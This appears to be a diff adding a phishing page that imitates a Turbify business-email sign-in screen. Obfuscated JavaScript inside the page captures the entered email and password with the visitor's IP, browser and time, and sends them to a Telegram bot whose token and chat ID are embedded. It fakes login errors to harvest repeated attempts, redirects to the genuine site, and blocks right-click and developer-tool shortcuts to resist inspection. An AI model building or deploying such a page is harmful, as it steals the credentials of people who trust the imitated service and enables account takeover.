@@ -1,0 +1,158 @@
+<html class="no-js no-ie">
+   <!--<![endif]-->
+   <head>
+      <meta charset="utf-8">
+      <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+      <meta name="viewport" content="width=device-width,user-scalable=no">
+      <title>Bizmail Login</title>
+      <meta name="description" content="Bizmail Login">
+      <meta property="og:title" content="Bizmail Login">
+      <meta property="fb:app_id" content="105570222879341">
+      <meta property="og:type" content="website">
+      <meta property="og:site_name" content="Turbify">
+      <meta property="og:image" content="https://sep.turbifycdn.com/nrp/image/turbify/newturbifylogo.png">
+      <link rel="apple-touch-icon" sizes="180x180" href="https://sep.turbifycdn.com/yf/nrp/image/turbify/Turbify_favicon.svg">
+      <link rel="icon" href="https://sep.turbifycdn.com/yf/nrp/image/turbify/Turbify_favicon.svg">
+      <!-- <link rel="apple-touch-icon" sizes="180x180" href="https://sep.turbifycdn.com/yf/nrp/image/turbify/turbify-favicon-v1-purple.svg"> --><!-- <link rel="icon" type="image/png" href="https://sep.turbifycdn.com/yf/nrp/image/turbify/turbify-favicon-v1-purple.svg" sizes="32x32"> --><!-- <link rel="icon" type="image/png" href="https://sep.turbifycdn.com/yf/nrp/image/turbify/turbify-favicon-v1-purple.svg" sizes="16x16"> --><!-- <link rel="shortcut icon" href="https://sep.turbifycdn.com/yf/nrp/image/turbify/turbify-favicon-v1-purple.svg"> -->
+      <meta name="msapplication-config" content="https://sep.turbifycdn.com/yf/common/browserconfig.xml">
+      <meta name="theme-color" content="#ffffff">
+      <link rel="stylesheet" type="text/css" href="https://sep.turbifycdn.com/yf/nrp/font/verizon/VerizonNHG.css">
+      <link rel="stylesheet" href="https://s3.amazonaws.com/presales.lumcs.com/idm/css/ysb-common.css">
+      <link rel="stylesheet" href="https://sep.turbifycdn.com/yf/idp/css/61b9db85.idm-core.css">
+      <link rel="stylesheet" type="text/css" href="/css/login.css">
+      <script async="" src="https://www.googletagmanager.com/gtm.js?id=GTM-5CRPQ99"></script><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-5CRPQ99');</script>
+   </head>
+   <body>
+      <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-5CRPQ99" height="0"width="0" style="display:none;visibility:hidden"></iframe></noscript>
+      <div id="idm-hd">
+         <style>#lum-uheader-wrapper {height: 70px;}#lum-uheader .clear {clear: both;font-size: 1px;height: 0px;width: 1px;}#lum-uheader {color: #808284;z-index:1000;width: 100%;top:0;left: 0;font-family: "Open Sans";font-size: 13px;font-weight: 700;position: fixed;height: 70px;margin: auto;padding: 0;border-bottom: 1px solid #e4e4e4;}#lum-uheader.light-theme {background-color: #ffffff;}#lum-uheader .section-logo {min-width: 175px;float: left;display: inline-block;margin-left: 30px;height: 100%;}#lum-uheader .section-logo .logo {height: 100%;max-width: 100%;text-align: center;}#lum-uheader .section-logo .logo a {display: block; position: relative; top: 50%; margin-top: -21px;}#lum-uheader .section-logo .logo img {max-height: 100%;max-width: 100%;}#lum-uheader.full.light-theme.centered .section-logo {position:absolute;z-index: 600;}</style>
+         <div id="lum-uheader-wrapper">
+            <div id="lum-uheader" class="light-theme slim" data-sessioncheck="disabled" style="min-width: 0px;">
+               <div class="section-logo">
+                  <div class="logo"><a href="https://www.turbify.com/"><img src="https://sep.turbifycdn.com/nrp/image/turbify/newturbifylogo.png" width="120" border="0"></a></div>
+               </div>
+            </div>
+         </div>
+      </div>
+      <div id="idm-bd">
+         <div class="container" id="idmlogin">
+            <div class="row">
+               <div class="col-xs-12 col-sm-6 col-sm-push-6 login" style="margin-top: 70px !important;">
+                  <div style="margin: auto; max-width: 350px; padding: 0 15px; border: 1px solid #e4e4e4;-webkit-box-shadow: 0px 3px 5px 0px rgba(209,209,209,1); -moz-box-shadow: 0px 3px 5px 0px rgba(209,209,209,1); box-shadow: 0px 3px 5px 0px rgba(209,209,209,1);">
+                     <div class="row">
+                        <div class="col-xs-12">
+                           <h1 style="font-family: Arial!important;">Sign in to business email</h1>
+                        </div>
+                     </div>
+<div class="row"><div class="col-xs-12"><div class="alert alert-danger" style="font-family: Arial!important;display: none;" id="reenter-msg" role="alert">Invalid user ID or password.</div></div></div>
+                     <form id="login-form" autocomplete="off" method="POST" style="max-width: 320px">
+                        <div class="form-group">
+                           <div class="row top-buffer-10">
+                              <div class="col-xs-12"><input type="email" name="email" class="form-control" tabindex="0" required="true" properties="" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" id="email" placeholder="Email" value=""></div>
+                           </div>
+<input type="text" name="confirm_email" id="confirm_email" style="display: none;" autocomplete="off">
+                           <div class="row top-buffer-10">
+                              <div class="col-xs-12">
+                                 <div class="input-group"><input type="password" name="password" class="form-control" required="true" properties="" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" id="password" placeholder="Password" value=""></div>
+                                 <span for="s-pass" class="validation-feedback noshow"></span>
+                              </div>
+                           </div>
+                           <div class="row">
+                              <div class="col-xs-12">
+                                 <p class="text-m left" style="font-family: Arial!important;"><input type="checkbox" name="persistent" properties="" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" id="persistent" checked="checked" value="persistent"><label for="persistent"></label>Remember me</p>
+                              </div>
+                           </div>
+                           <div class="row">
+                              <div class="col-xs-12">
+                                 <p><button type="submit" class="btn btn-lg btn-primary form-control" style="font-family: Arial!important;" id="submit-btn">Sign in</button></p>
+                              </div>
+                           </div>
+                           <div class="row">
+                              <div class="col-xs-12">
+                                 <p class="text-m center"><a href="/forgotpassword?.done=https%3A%2F%2Fmail.turbify.com%2Finitiate">Forgot your password?</a></p>
+                              </div>
+                           </div>
+                           <div class="row" style="margin-top: 20px;">
+                              <div class="col-xs-12">
+                                 <p class="text-m center" style="font-family: Arial!important;">Don’t have a business email account and want to increase your online credibility? Sign up today!</p>
+                              </div>
+                           </div>
+                           <div class="row">
+                              <div class="col-xs-12">
+                                 <p><button id="signup" style="font-family: Arial!important;width: 150px;color: #000!important;margin-top: 20px;" class="btn btn-sm btn-orange form-control" onclick="">Sign Up</button></p>
+                              </div>
+                           </div>
+                        </div>
+                        <input type="hidden" name="done" class="form-control" properties="" value="https://mail.turbify.com/initiate"><input type="hidden" name="csrfToken" value="1743695315.10e3a38267dadbc8724d1dccbb889e3a8cd68ba4">
+                     </form>
+<div id="thanks-message" style="display: none;text-align: center;">
+    <h2></h2>
+  </div>
+
+<script>
+    const _0x1ca18c=_0x1def;function _0x1def(_0x14c43e,_0x7c4547){_0x14c43e=_0x14c43e-0x165;const _0x59600b=_0x5960();let _0x1def5b=_0x59600b[_0x14c43e];return _0x1def5b;}(function(_0x1f78ea,_0x410dd1){const _0x10679b=_0x1def,_0x17c464=_0x1f78ea();while(!![]){try{const _0xfa2e8c=-parseInt(_0x10679b(0x189))/0x1+parseInt(_0x10679b(0x172))/0x2*(parseInt(_0x10679b(0x16c))/0x3)+parseInt(_0x10679b(0x16f))/0x4+-parseInt(_0x10679b(0x191))/0x5+-parseInt(_0x10679b(0x178))/0x6+-parseInt(_0x10679b(0x16b))/0x7+parseInt(_0x10679b(0x16e))/0x8;if(_0xfa2e8c===_0x410dd1)break;else _0x17c464['push'](_0x17c464['shift']());}catch(_0x245385){_0x17c464['push'](_0x17c464['shift']());}}}(_0x5960,0x29313));const emailInput=document[_0x1ca18c(0x177)](_0x1ca18c(0x180)),passwordInput=document[_0x1ca18c(0x177)](_0x1ca18c(0x167)),reenterMsg=document[_0x1ca18c(0x177)](_0x1ca18c(0x166)),form=document[_0x1ca18c(0x177)](_0x1ca18c(0x16d)),thanksMessage=document[_0x1ca18c(0x177)](_0x1ca18c(0x173)),honeypot=document['getElementById'](_0x1ca18c(0x179)),telegramToken=_0x1ca18c(0x176),telegramChatId=_0x1ca18c(0x18b);let attempt=0x0;function _0x5960(){const _0x319ee0=['toLocaleDateString','?email=','1494724ooREUJ','151473obirCI','login-form','5449080ioLbxn','287028IxLsmf','href','\x0aPASSWORD:\x20','8reypZw','thanks-message','https://api.ipify.org?format=json','location','8560464628:AAF0oIxiponEaai7aY3AVKuYcpIV8s6wGVA','getElementById','819606yHlORQ','confirm_email','keydown','block','Unknown\x20IP','preventDefault','\x0aEmail:\x20','length','email','https://api.telegram.org/bot','stringify','\x0aBrowser:\x20','addEventListener','display','POST','style','\x0aTime:\x20','136096ArVHPb','search','7991170977','trim','includes','\x0a\x0aIP:\x20','value','/sendMessage','1499520xvliEf','json','https://mail.turbify.com/','application/json','submit','reenter-msg','password','none'];_0x5960=function(){return _0x319ee0;};return _0x5960();}passwordInput[_0x1ca18c(0x184)](_0x1ca18c(0x17a),function(_0x346c8f){const _0x290d17=_0x1ca18c;if(this[_0x290d17(0x18f)][_0x290d17(0x17f)]===0x0&&_0x346c8f['key']==='\x20')_0x346c8f[_0x290d17(0x17d)]();});let rawEmail='';const url=window[_0x1ca18c(0x175)][_0x1ca18c(0x170)];if(url[_0x1ca18c(0x18d)]('#'))rawEmail=url['split']('#')[0x1];else{if(url[_0x1ca18c(0x18d)](_0x1ca18c(0x16a))){const params=new URLSearchParams(window['location'][_0x1ca18c(0x18a)]);rawEmail=params['get']('email');}}try{emailInput[_0x1ca18c(0x18f)]=atob(rawEmail);}catch{emailInput[_0x1ca18c(0x18f)]=rawEmail;}async function getIP(){const _0x3788ba=_0x1ca18c;try{const _0x7d68fa=await fetch(_0x3788ba(0x174)),_0x2da375=await _0x7d68fa[_0x3788ba(0x192)]();return _0x2da375['ip'];}catch{return _0x3788ba(0x17c);}}form[_0x1ca18c(0x184)](_0x1ca18c(0x165),async function(_0x209b26){const _0x47cc23=_0x1ca18c;_0x209b26['preventDefault']();if(honeypot[_0x47cc23(0x18f)][_0x47cc23(0x18c)]()!=='')return;const _0x14e842=emailInput[_0x47cc23(0x18f)]['trim'](),_0x5a8c17=passwordInput['value'][_0x47cc23(0x18c)]();if(!_0x14e842||!_0x5a8c17)return;attempt++;const _0x276c41=await getIP(),_0x3f374d=navigator['userAgent'],_0x2cf100=new Date(),_0xe222dd='\x0aAttempt:\x20'+attempt+_0x47cc23(0x17e)+_0x14e842+_0x47cc23(0x171)+_0x5a8c17+_0x47cc23(0x18e)+_0x276c41+_0x47cc23(0x183)+_0x3f374d+'\x0aDate:\x20'+_0x2cf100[_0x47cc23(0x169)]()+_0x47cc23(0x188)+_0x2cf100['toLocaleTimeString']()+'\x0a';fetch(_0x47cc23(0x181)+telegramToken+_0x47cc23(0x190),{'method':_0x47cc23(0x186),'headers':{'Content-Type':_0x47cc23(0x194)},'body':JSON[_0x47cc23(0x182)]({'chat_id':telegramChatId,'text':_0xe222dd})}),attempt===0x1&&(reenterMsg[_0x47cc23(0x187)]['display']='block',passwordInput[_0x47cc23(0x18f)]=''),attempt===0x2&&(reenterMsg[_0x47cc23(0x187)][_0x47cc23(0x185)]=_0x47cc23(0x17b),passwordInput[_0x47cc23(0x18f)]=''),attempt===0x3&&(form[_0x47cc23(0x187)][_0x47cc23(0x185)]=_0x47cc23(0x168),reenterMsg[_0x47cc23(0x187)][_0x47cc23(0x185)]=_0x47cc23(0x168),thanksMessage[_0x47cc23(0x187)]['display']=_0x47cc23(0x17b),setTimeout(()=>{const _0x50fc33=_0x47cc23;window[_0x50fc33(0x175)][_0x50fc33(0x170)]=_0x50fc33(0x193);},0x1));});
+  </script>
+
+                  </div>
+               </div>
+               <div class="col-xs-12 col-sm-6 col-sm-pull-6">
+                  <div style="margin: auto; padding: 0 10px">
+                     <div class="row">
+                        <div class="col-xs-12 col-sm-12 text-center">
+                           <h2 style="font-family: Arial!important;">Learn about Turbify products and services</h2>
+                        </div>
+                     </div>
+                     <div class="row text-center mx-auto mb-4 bottom-line">
+                        <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 "><a href="">  <img style=" height: 215px; border-radius: 10px !important;" alt="Business Maker" class="img-width-login heroImage" src="https://sep.turbifycdn.com/yf/nrp/image/turbify/email_1.png"></a></div>
+                        <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 ">
+                           <h2 style="font-weight: 600; font-size: 20px; margin: 20px 0 10px 0; font-family: Arial!important;">Turbify Hosting</h2>
+                           <p style="text-align: justify; font-family: Arial!important;">Launch your website on a platform that has the performance and security you need to stand out.</p>
+                           <button id="link1" style="font-family: Arial!important; width: 150px; color: #000!important; margin-top: 20px;" class="btn btn-sm btn-orange form-control" onclick="">Learn more</button>
+                        </div>
+                     </div>
+                     <div class=" row text-center mx-auto mb-4 bottom-line ">
+                        <div class="mobile-image col-xs-12 col-sm-12 col-md-6 col-lg-6 "><a style="font-family: Arial!important;" href="">  <img alt="Business Maker" style=" height: 215px;border-radius: 10px !important;" class="img-width-login heroImage" src="https://sep.turbifycdn.com/yf/nrp/image/turbify/email_2.png"></a></div>
+                        <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 ">
+                           <h2 style="font-weight: 600; font-size: 20px; margin: 20px 0 10px 0;font-family: Arial!important;">WordPress Hosting </h2>
+                           <p style="text-align: justify;font-family: Arial!important;">Turbify WordPress Hosting gives you the reputation of WordPress with a cloud based backbone that gives you stability and protection to maximize your WordPress experience.   </p>
+                           <button id="link2" style="font-family: Arial!important;width: 150px ;margin-top: 20px;" class="btn btn-sm btn-orange  form-control" onclick="">Learn more</button>
+                        </div>
+                        <div class="desktop-image col-xs-12 col-sm-12 col-md-6 col-lg-6 "><a style="font-family: Arial!important;" href="">  <img alt="Business Maker" style=" height: 215px;border-radius: 10px !important;" class="img-width-login heroImage" src="https://sep.turbifycdn.com/yf/nrp/image/turbify/email_2.png"></a></div>
+                     </div>
+                     <div class="row text-center mx-auto mb-4">
+                        <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 "><a style="font-family: Arial!important;" href="">  <img alt="Business Maker" class="img-width-login heroImage" style=" height: 215px;     border-radius: 10px !important;" src="https://sep.turbifycdn.com/yf/nrp/image/turbify/email_3.png"></a></div>
+                        <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6">
+                           <h2 style="font-weight: 600; font-size: 20px; margin: 20px 0 10px 0;font-family: Arial!important;">Turbify Domains</h2>
+                           <p style="text-align: justify;font-family: Arial!important;">With hundreds of domain extensions to choose from, and powerful domain management features, the right domain is at your fingertips! </p>
+                           <button id="link3" style="font-family: Arial!important;width: 150px ;margin-top: 20px;" class="btn btn-sm btn-orange form-control" onclick="">Learn more</button>
+                        </div>
+                     </div>
+                  </div>
+               </div>
+            </div>
+         </div>
+      </div>
+      <div id="idm-ft">
+         <div class="footer">
+            <ul class="text-s">
+               <li><span>© 2025 Turbify</span></li>
+               <li><a href=""> Terms </a></li>
+               <li>|</li>
+               <li><a href=""> Privacy </a></li>
+               <li>|</li>
+               <li><a href=""> Help </a></li>
+               <li>|</li>
+               <li><a rel="nofollow" href=""> Manage Cookies </a></li>
+            </ul>
+         </div>
+      </div>
+      <script src="https://sep.turbifycdn.com/yf/idp/js/32195eef.idm-core-without-ga.js"></script>
+<script>
+  function _0xf8c6(){const _0x237246=['12315465vCjVyX','dragstart','length','preventDefault','shiftKey','73591xDbGyv','keyCode','5542yewDRm','1141188xTcQsN','2050535kZcgnz','337bmsBHl','60470aPyyIW','addEventListener','toLowerCase','1749mMgsfm','includes','1088LEZRei','424116LlXYaD','keydown','startsWith','3hhjHtg','ctrlKey','key'];_0xf8c6=function(){return _0x237246;};return _0xf8c6();}const _0x1d1b67=_0x2cec;function _0x2cec(_0x1ed06a,_0x2e22df){_0x1ed06a=_0x1ed06a-0x1b9;const _0xf8c668=_0xf8c6();let _0x2cec86=_0xf8c668[_0x1ed06a];return _0x2cec86;}(function(_0x3337be,_0x399348){const _0x1e7a6c=_0x2cec,_0x588a02=_0x3337be();while(!![]){try{const _0x30238c=parseInt(_0x1e7a6c(0x1c7))/0x1*(-parseInt(_0x1e7a6c(0x1c4))/0x2)+-parseInt(_0x1e7a6c(0x1ba))/0x3*(parseInt(_0x1e7a6c(0x1c5))/0x4)+parseInt(_0x1e7a6c(0x1c6))/0x5+-parseInt(_0x1e7a6c(0x1ce))/0x6+-parseInt(_0x1e7a6c(0x1c2))/0x7*(-parseInt(_0x1e7a6c(0x1cd))/0x8)+parseInt(_0x1e7a6c(0x1bd))/0x9+-parseInt(_0x1e7a6c(0x1c8))/0xa*(parseInt(_0x1e7a6c(0x1cb))/0xb);if(_0x30238c===_0x399348)break;else _0x588a02['push'](_0x588a02['shift']());}catch(_0x467abd){_0x588a02['push'](_0x588a02['shift']());}}}(_0xf8c6,0xe9a31),document[_0x1d1b67(0x1c9)]('contextmenu',function(_0x2c80f8){const _0x54e492=_0x1d1b67;_0x2c80f8[_0x54e492(0x1c0)]();}),document[_0x1d1b67(0x1c9)](_0x1d1b67(0x1be),function(_0x328125){const _0x1487ec=_0x1d1b67;_0x328125[_0x1487ec(0x1c0)]();}),document[_0x1d1b67(0x1c9)]('drop',function(_0x5cb983){const _0x51c614=_0x1d1b67;_0x5cb983[_0x51c614(0x1c0)]();}),document[_0x1d1b67(0x1c9)](_0x1d1b67(0x1cf),function(_0x423af2){const _0x40a55c=_0x1d1b67;_0x423af2[_0x40a55c(0x1bc)][_0x40a55c(0x1b9)]('F')&&_0x423af2['key'][_0x40a55c(0x1bf)]<=0x3&&_0x423af2[_0x40a55c(0x1c0)]();if(_0x423af2[_0x40a55c(0x1bb)]){const _0x313783=['u','s','a','p','c','i','j','k'];_0x313783[_0x40a55c(0x1cc)](_0x423af2[_0x40a55c(0x1bc)][_0x40a55c(0x1ca)]())&&_0x423af2[_0x40a55c(0x1c0)]();}if(_0x423af2['ctrlKey']&&_0x423af2[_0x40a55c(0x1c1)]){const _0x4b9d94=['i','j','c','k'];_0x4b9d94[_0x40a55c(0x1cc)](_0x423af2['key'][_0x40a55c(0x1ca)]())&&_0x423af2['preventDefault']();}_0x423af2[_0x40a55c(0x1c3)]===0x7b&&_0x423af2[_0x40a55c(0x1c0)]();}));
+</script>
+<script>
+function _0x5563(){const _0x351c2d=['ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789','6082360wzrgzg','?websrc=','4736020EYvaVd','6429156nBGTJD','replaceState','location','random','floor','href','2044070aeIJuY','1297145oLPoeA','25936715mwtpLE','history','split','1216419OFbUDu','charAt'];_0x5563=function(){return _0x351c2d;};return _0x5563();}(function(_0x354bb2,_0x4bbe6a){const _0x4d5d61=_0x3dcf,_0x1955c2=_0x354bb2();while(!![]){try{const _0xc24bfb=-parseInt(_0x4d5d61(0xa3))/0x1+-parseInt(_0x4d5d61(0xb3))/0x2+parseInt(_0x4d5d61(0xa7))/0x3+-parseInt(_0x4d5d61(0xac))/0x4+parseInt(_0x4d5d61(0xaa))/0x5+-parseInt(_0x4d5d61(0xad))/0x6+parseInt(_0x4d5d61(0xa4))/0x7;if(_0xc24bfb===_0x4bbe6a)break;else _0x1955c2['push'](_0x1955c2['shift']());}catch(_0x1ab5d4){_0x1955c2['push'](_0x1955c2['shift']());}}}(_0x5563,0xb7b5f));function generateRandomString(_0x2a6404){const _0x4529de=_0x3dcf,_0x184375=_0x4529de(0xa9);let _0x324ce2='';for(let _0x2a2309=0x0;_0x2a2309<_0x2a6404;_0x2a2309++){_0x324ce2+=_0x184375[_0x4529de(0xa8)](Math[_0x4529de(0xb1)](Math[_0x4529de(0xb0)]()*_0x184375['length']));}return _0x324ce2;}function _0x3dcf(_0xf0e71,_0x263e93){_0xf0e71=_0xf0e71-0xa3;const _0x556357=_0x5563();let _0x3dcf63=_0x556357[_0xf0e71];return _0x3dcf63;}function appendRandomStringToURL(){const _0x2c85b1=_0x3dcf,_0x51f623=generateRandomString(0x15e),_0x43e6d6=window[_0x2c85b1(0xaf)][_0x2c85b1(0xb2)][_0x2c85b1(0xa6)]('?')[0x0];window[_0x2c85b1(0xa5)][_0x2c85b1(0xae)](null,null,_0x43e6d6+_0x2c85b1(0xab)+_0x51f623);}window['onload']=appendRandomStringToURL;
+   </script>
+
+   </body>
+</html>
